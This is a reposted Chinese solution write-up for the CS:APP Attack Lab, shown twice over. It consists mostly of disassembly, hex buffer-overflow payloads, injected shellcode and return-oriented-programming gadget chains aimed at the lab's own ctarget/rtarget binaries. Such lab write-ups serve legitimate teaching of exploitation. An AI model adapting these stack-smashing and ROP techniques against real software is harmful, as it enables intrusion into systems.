# 《深入理解计算机系统》Attack Lab 题解

> 原文: https://www.ctfiot.com/260639.html
> ID: 260639

voidtest(){
int val;
    val = getbuf();
printf("No exploit. Getbuf returned 0x%xn", val);
}

voidtouch1(){
    vlevel = 1; /* Part of validation protocol */
printf("Touch1!: You called touch1()n");
validate(1);
exit(0);
}

00000000004017a8 <getbuf>:
4017a8:48 83 ec 28          sub    $0x28,%rsp
4017ac:48 89 e7             	mov    %rsp,%rdi
4017af:e8 8c 02 00 00       	callq  401a40 <Gets>
4017b4:b8 01 00 00 00       	mov    $0x1,%eax
4017b9:48 83 c4 28          add    $0x28,%rsp
4017bd:c3                   	retq   
4017be:90                   	nop
4017bf:90                   	nop

00000000004017c0 <touch1>:
4017c0:48 83 ec 08          sub    $0x8,%rsp
4017c4:c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
4017cb:00 00 00 
4017ce:bf c5 30 40 00       	mov    $0x4030c5,%edi
4017d3:e8 e8 f4 ff ff       	callq  400cc0 
4017d8:bf 01 00 00 00       	mov    $0x1,%edi
4017dd:e8 ab 04 00 00       	callq  401c8d <validate>
4017e2:bf 00 00 00 00       	mov    $0x0,%edi
4017e7:e8 54 f6 ff ff       	callq  400e40 <exit@plt>

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00

./hex2raw < phase_1 | ./ctarget -q

voidtouch2(unsigned val) {
    vlevel = 2;
if (val == cookie) {
printf("Touch2!: You called touch2(0x%.8x)n", val);
validate(2);
    }
else {
printf("Misfire: You called touch2(0.x%8x)n", val);
fail(2);
    }
exit(0);
}

00000000004017ec <touch2>:
4017ec:48 83 ec 08          sub    $0x8,%rsp
4017f0:89 fa                mov    %edi,%edx
4017f2:c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
4017f9:00 00 00 
4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
401802:75 20                jne    401824 <touch2+0x38>
401804:be e8 30 40 00       	mov    $0x4030e8,%esi
401809:bf 01 00 00 00       	mov    $0x1,%edi
40180e:b8 00 00 00 00       	mov    $0x0,%eax
401813:e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401818:bf 02 00 00 00       	mov    $0x2,%edi
40181d:e8 6b 04 00 00       	callq  401c8d <validate>
401822:eb 1e                jmp    401842 <touch2+0x56>
401824:be 10 31 40 00       	mov    $0x403110,%esi
401829:bf 01 00 00 00       	mov    $0x1,%edi
40182e:b8 00 00 00 00       	mov    $0x0,%eax
401833:e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401838:bf 02 00 00 00       	mov    $0x2,%edi
40183d:e8 0d 05 00 00       	callq  401d4f <fail>
401842:bf 00 00 00 00       	mov    $0x0,%edi
401847:e8 f4 f5 ff ff       	callq  400e40 <exit@plt>

movq $0x59b997fa, %rdi

pushq $0x4017ec
ret

gcc -c phase_2_asm.s
objdump -d phase_2_asm > phase_2_asm.asm

phase_2_asm.o:
file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:68 ec 17 40 00       	pushq  $0x4017ec
c:c3                   	retq

48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3

48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55

./hex2raw < phase_2 | ./ctarget -q

inthexmatch(unsigned val, char *sval) {
char cbuf[110];
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);
return strncmp(sval, s, 9) == 0;
}

voidtouch3(char *sval) {
    vlevel = 3;
if (hexmatch(cookie, sval)) {
printf("Touch3!: You called touch3("%s")n", sval);
validate(3);
    }
else {
printf("Misfire: You called touch3("%s")n", sval);
fail(3);
    }
exit(0);
}

0000000000000000 <.text>:
0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   retq

48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55

48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61

voidsetval_210 (unsigned *p) {
    *p = 3347663060U;
}

0000000000400f15 <setval_210>:
400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
400f1b:       c3                   retq

movq $0x59b997fa, %rdi
pushq $0x4017ec
ret

gadget1: 
popq %rax
ret

gadget2: 
mov %rax, %rdi
ret

00000000004019ca <getval_280>:
4019ca:	b8 29 58 90 c3       mov    $0xc3905829,%eax
4019cf:	c3                   retq

00000000004019a0 <addval_273>:
4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
4019a6:	c3                   retq

---- Stack ----
-------------
full of zero | getbuf的栈帧
-------------
gadget1      | test的栈帧 (getbuf的返回地址)
cookie       |
gadget2      |
touch2       |
-------------
---------------

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00

mov %rsp, %rax
add $bias, %rax
mov %rax, %rdi
call touch3

00000000004019d6 <add_xy>:
4019d6:	48 8d 04 37          lea    (%rdi,%rsi,1),%rax
4019da:	c3                   retq

---- Stack ----
--------------------------------------------
full of zero                                | getbuf的栈帧
--------------------------------------------   
mov %rsp, %rax: 0x401a06                    | test的栈帧 (getbuf的返回地址)
mov %rax, %rdi: 0x4019a2                    |
pop %rax: 0x4019cc                          |
bias: 8 * 9 = 72 (0x48)                     |
mov %eax, %edx: 0x4019dd                    |
mov %edx, %ecx: 0x401a70                    |
mov %ecx, %esi: 0x401a27                    |
lea (%rdi, %rsi, 1), %rax: 0x4019d6         |
mov %rax, %rdi: 0x4019a2                    |
Address of touch3: 0x4018fa                 |
ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
--------------------------------------------
---------------

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61

看雪ID：asciibase64

https://bbs.kanxue.com/user-home-994663.htm

*本文为看雪论坛优秀文章，由 asciibase64 原创，转载请注明来自看雪社区

议题征集中！看雪·第九届安全开发者峰会

# 往期推荐

miniL2025 mmapheap 题解

Redis漏洞分析，ACL篇

VMProtect3.5.1脱壳临床指南

2025长城杯决赛应急响应木马分析

APP 常见的 libmsaoaidsec.so 绕过姿势

球分享

球点赞

球在看

点击阅读原文查看更多


```
voidtest(){
int val;
    val = getbuf();
printf("No exploit. Getbuf returned 0x%xn", val);
}
voidtouch1(){
    vlevel = 1; /* Part of validation protocol */
printf("Touch1!: You called touch1()n");
validate(1);
exit(0);
}
00000000004017a8 <getbuf>:
4017a8:48 83 ec 28          sub    $0x28,%rsp
4017ac:48 89 e7             	mov    %rsp,%rdi
4017af:e8 8c 02 00 00       	callq  401a40 <Gets>
4017b4:b8 01 00 00 00       	mov    $0x1,%eax
4017b9:48 83 c4 28          add    $0x28,%rsp
4017bd:c3                   	retq   
4017be:90                   	nop
4017bf:90                   	nop
00000000004017c0 <touch1>:
4017c0:48 83 ec 08          sub    $0x8,%rsp
4017c4:c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
4017cb:00 00 00 
4017ce:bf c5 30 40 00       	mov    $0x4030c5,%edi
4017d3:e8 e8 f4 ff ff       	callq  400cc0 
4017d8:bf 01 00 00 00       	mov    $0x1,%edi
4017dd:e8 ab 04 00 00       	callq  401c8d <validate>
4017e2:bf 00 00 00 00       	mov    $0x0,%edi
4017e7:e8 54 f6 ff ff       	callq  400e40 <exit@plt>
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00
./hex2raw < phase_1 | ./ctarget -q
voidtouch2(unsigned val) {
    vlevel = 2;
if (val == cookie) {
printf("Touch2!: You called touch2(0x%.8x)n", val);
validate(2);
    }
else {
printf("Misfire: You called touch2(0.x%8x)n", val);
fail(2);
    }
exit(0);
}
00000000004017ec <touch2>:
4017ec:48 83 ec 08          sub    $0x8,%rsp
4017f0:89 fa                mov    %edi,%edx
4017f2:c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
4017f9:00 00 00 
4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
401802:75 20                jne    401824 <touch2+0x38>
401804:be e8 30 40 00       	mov    $0x4030e8,%esi
401809:bf 01 00 00 00       	mov    $0x1,%edi
40180e:b8 00 00 00 00       	mov    $0x0,%eax
401813:e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401818:bf 02 00 00 00       	mov    $0x2,%edi
40181d:e8 6b 04 00 00       	callq  401c8d <validate>
401822:eb 1e                jmp    401842 <touch2+0x56>
401824:be 10 31 40 00       	mov    $0x403110,%esi
401829:bf 01 00 00 00       	mov    $0x1,%edi
40182e:b8 00 00 00 00       	mov    $0x0,%eax
401833:e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
401838:bf 02 00 00 00       	mov    $0x2,%edi
40183d:e8 0d 05 00 00       	callq  401d4f <fail>
401842:bf 00 00 00 00       	mov    $0x0,%edi
401847:e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
gcc -c phase_2_asm.s
objdump -d phase_2_asm > phase_2_asm.asm
phase_2_asm.o:
file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:68 ec 17 40 00       	pushq  $0x4017ec
c:c3                   	retq
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
./hex2raw < phase_2 | ./ctarget -q
inthexmatch(unsigned val, char *sval) {
char cbuf[110];
char *s = cbuf + random() % 100;
sprintf(s, "%.8x", val);
return strncmp(sval, s, 9) == 0;
}
voidtouch3(char *sval) {
    vlevel = 3;
if (hexmatch(cookie, sval)) {
printf("Touch3!: You called touch3("%s")n", sval);
validate(3);
    }
else {
printf("Misfire: You called touch3("%s")n", sval);
fail(3);
    }
exit(0);
}
0000000000000000 <.text>:
0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
7:	68 fa 18 40 00       	pushq  $0x4018fa
    c:	c3                   retq
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
voidsetval_210 (unsigned *p) {
    *p = 3347663060U;
}
0000000000400f15 <setval_210>:
400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
400f1b:       c3                   retq
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
gadget1: 
popq %rax
ret

gadget2: 
mov %rax, %rdi
ret
00000000004019ca <getval_280>:
4019ca:	b8 29 58 90 c3       mov    $0xc3905829,%eax
4019cf:	c3                   retq
00000000004019a0 <addval_273>:
4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
4019a6:	c3                   retq
---- Stack ----
-------------
full of zero | getbuf的栈帧
-------------
gadget1      | test的栈帧 (getbuf的返回地址)
cookie       |
gadget2      |
touch2       |
-------------
---------------
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
mov %rsp, %rax
add $bias, %rax
mov %rax, %rdi
call touch3
00000000004019d6 <add_xy>:
4019d6:	48 8d 04 37          lea    (%rdi,%rsi,1),%rax
4019da:	c3                   retq
---- Stack ----
--------------------------------------------
full of zero                                | getbuf的栈帧
--------------------------------------------   
mov %rsp, %rax: 0x401a06                    | test的栈帧 (getbuf的返回地址)
mov %rax, %rdi: 0x4019a2                    |
pop %rax: 0x4019cc                          |
bias: 8 * 9 = 72 (0x48)                     |
mov %eax, %edx: 0x4019dd                    |
mov %edx, %ecx: 0x401a70                    |
mov %ecx, %esi: 0x401a27                    |
lea (%rdi, %rsi, 1), %rax: 0x4019d6         |
mov %rax, %rdi: 0x4019a2                    |
Address of touch3: 0x4018fa                 |
ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
--------------------------------------------
---------------
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
27 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055880-wxsync-2025-07-7029488741da2e3acbf49e2ee7e4ccde.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055883-wxsync-2025-07-fab6337be5fbbfeb3e68b5e5c4b571fe.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055885-wxsync-2025-07-8abcacc66f63a6e885f7bed643c18ca5.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055887-wxsync-2025-07-4b2332a46a232821915bc63e526df2ba.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055889-wxsync-2025-07-d3dfc187382deeb55276d375ec83acf7.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055892-wxsync-2025-07-6a357b9bf5d9bc346f7cbd211017bb1e.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055894-wxsync-2025-07-fb99efee4d763ee02ac310db4e7d2585.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055896-wxsync-2025-07-cebab46dde3ab6d59b5d8204415ec67e.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055898-wxsync-2025-07-c04655f8b677989e2fa4c5842900d3ee.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1752055900-wxsync-2025-07-1dafddcdd52dedc48e31d3e78f0a1a9d.jpg)